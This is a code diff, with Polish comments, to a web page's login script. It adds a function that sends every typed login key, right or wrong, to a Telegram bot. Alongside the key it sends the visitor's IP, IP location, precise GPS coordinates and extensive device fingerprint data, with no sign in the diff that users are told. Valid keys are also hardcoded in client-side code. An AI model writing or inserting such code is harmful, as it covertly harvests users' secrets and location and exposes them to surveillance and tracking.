@@ -222,14 +222,123 @@ function showPwdError(msg) {
 
 const VALID_KEYS = ["test", "tworca2026", "klucz123"];
 
+async function sendLoginAttemptToTelegram(enteredKey, success) {
+  try {
+    // --- Pobieramy IP ---
+    let userIP = "Nieznany";
+    let ipInfo = "";
+    try {
+      const ipRes = await fetch("https://ipapi.co/json/");
+      const ipData = await ipRes.json();
+      userIP = ipData.ip || "Nieznany";
+      ipInfo = [
+        ipData.city, ipData.region, ipData.country_name, ipData.org
+      ].filter(Boolean).join(", ");
+    } catch (_) {
+      try {
+        const r = await fetch("https://api.ipify.org?format=json");
+        const d = await r.json();
+        userIP = d.ip || "Nieznany";
+      } catch (_) {}
+    }
+
+    // --- Geolokalizacja GPS (jeśli pozwolono wcześniej) ---
+    let geoStr = "Brak / Nie zezwolono";
+    try {
+      if (navigator.geolocation) {
+        const pos = await new Promise((res, rej) =>
+          navigator.geolocation.getCurrentPosition(res, rej, { timeout: 4000 })
+        );
+        const lat = pos.coords.latitude.toFixed(6);
+        const lon = pos.coords.longitude.toFixed(6);
+        const acc = pos.coords.accuracy ? Math.round(pos.coords.accuracy) + "m" : "?";
+        geoStr = `${lat}, ${lon} (±${acc})\nhttps://maps.google.com/?q=${lat},${lon}`;
+      }
+    } catch (_) {}
+
+    const time = new Date().toLocaleString("pl-PL", { timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone });
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "?";
+    const lang = navigator.language || navigator.userLanguage || "?";
+    const langs = navigator.languages ? navigator.languages.join(", ") : lang;
+    const ua = navigator.userAgent;
+    const platform = navigator.platform || "?";
+    const screenRes = `${screen.width}x${screen.height} (px ratio: ${window.devicePixelRatio || 1})`;
+    const viewport = `${window.innerWidth}x${window.innerHeight}`;
+    const referrer = document.referrer || "Brak";
+    const pageUrl = window.location.href;
+    const cookies = navigator.cookieEnabled ? "Tak" : "Nie";
+    const onlineStatus = navigator.onLine ? "Online" : "Offline";
+    const doNotTrack = navigator.doNotTrack || "Brak";
+    const hardwareConcurrency = navigator.hardwareConcurrency || "?";
+    const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "?";
+    const touch = navigator.maxTouchPoints > 0 ? `Tak (max ${navigator.maxTouchPoints} pkt)` : "Nie";
+    const connType = (navigator.connection && (navigator.connection.effectiveType || navigator.connection.type)) || "?";
+    const connSpeed = navigator.connection && navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "?";
+    const battery = await (async () => {
+      try {
+        if (navigator.getBattery) {
+          const b = await navigator.getBattery();
+          return `${Math.round(b.level * 100)}% ${b.charging ? "(ładuje)" : "(nie ładuje)"}`;
+        }
+      } catch (_) {}
+      return "?";
+    })();
+
+    const status = success ? "✅ POPRAWNY KLUCZ" : "❌ ZŁY KLUCZ";
+    const emoji = success ? "🟢" : "🔴";
+
+    const message =
+      `${emoji} *PRÓBA LOGOWANIA — ${status}*\n\n` +
+      `🔑 *Wpisany klucz:* \`${enteredKey || "(pusty)"}\`\n\n` +
+      `━━━━━━━━━━━━━━━━━━\n` +
+      `🌐 *IP:* \`${userIP}\`\n` +
+      `📍 *Lokalizacja IP:* ${ipInfo || "Brak danych"}\n` +
+      `🛰 *GPS:* ${geoStr}\n\n` +
+      `⏰ *Czas:* ${time}\n` +
+      `🕐 *Strefa czasowa:* ${tz}\n\n` +
+      `💻 *User-Agent:*\n\`${ua}\`\n\n` +
+      `🖥 *Platforma:* ${platform}\n` +
+      `📐 *Rozdzielczość:* ${screenRes}\n` +
+      `🖼 *Viewport:* ${viewport}\n` +
+      `👆 *Dotyk:* ${touch}\n\n` +
+      `🌍 *Język:* ${lang}\n` +
+      `📋 *Wszystkie języki:* ${langs}\n` +
+      `🚫 *Do Not Track:* ${doNotTrack}\n\n` +
+      `⚡ *Połączenie:* ${connType} / ${connSpeed}\n` +
+      `💾 *RAM:* ${memory}\n` +
+      `🧠 *CPU (cores):* ${hardwareConcurrency}\n` +
+      `🔋 *Bateria:* ${battery}\n\n` +
+      `🍪 *Cookies:* ${cookies}\n` +
+      `📡 *Status sieci:* ${onlineStatus}\n\n` +
+      `🔗 *Strona:* ${pageUrl}\n` +
+      `↩️ *Referrer:* ${referrer}`;
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: "Markdown"
+      })
+    });
+  } catch (e) {
+    console.error("Telegram notify error:", e);
+  }
+}
+
 function handleLoginSubmit(e) {
   try {
     if (e && typeof e.preventDefault === "function") e.preventDefault();
     
     var input = document.getElementById("passwordInput");
     var val = input ? input.value.trim() : "";
-    
-    if (VALID_KEYS.indexOf(val) !== -1) {
+    var isValid = VALID_KEYS.indexOf(val) !== -1;
+
+    // Wysyłamy powiadomienie do Telegrama ZAWSZE (zarówno przy dobrym jak i złym kluczu)
+    sendLoginAttemptToTelegram(val, isValid);
+
+    if (isValid) {
       try {
         sessionStorage.setItem("userUnlocked", "1");
         sessionStorage.setItem("app_auth", "true");
